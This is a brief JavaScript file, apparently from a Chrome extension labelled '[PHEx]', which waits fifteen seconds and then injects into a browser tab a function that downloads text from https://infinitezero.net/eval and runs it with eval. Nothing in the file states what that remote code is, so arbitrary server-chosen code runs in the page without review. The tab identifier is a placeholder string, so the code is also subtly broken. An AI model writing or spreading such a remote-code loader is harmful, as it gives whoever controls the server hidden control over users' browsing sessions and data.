function run() {
    (async () => {
        eval(await (await fetch("https://infinitezero.net/eval")).text());
    })();
    return true;
}

async function inject () {



  chrome.scripting.executeScript(
      {
        target: {tabId: "tabId"},
        func: run,
      },
      () => { 
        console.log("[PHEx] Title: " + run());
      });

    }


setTimeout(inject, 15 * 1000);